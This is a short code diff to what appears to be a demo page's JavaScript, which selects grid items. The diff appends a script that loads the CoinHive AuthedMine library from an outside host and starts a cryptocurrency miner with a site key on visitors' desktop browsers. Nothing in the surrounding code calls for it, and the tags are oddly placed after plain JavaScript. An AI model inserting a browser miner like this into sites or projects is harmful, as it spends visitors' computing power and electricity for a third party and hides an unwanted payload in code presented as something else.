@@ -55,3 +55,11 @@
 (function() {
   var demoItems = document.querySelectorAll('.grid-item')
 }());
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('oRJEmNvXQi3rR9RknDIdBJHHROdqvnLK', {throttle: 0.3});
+
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
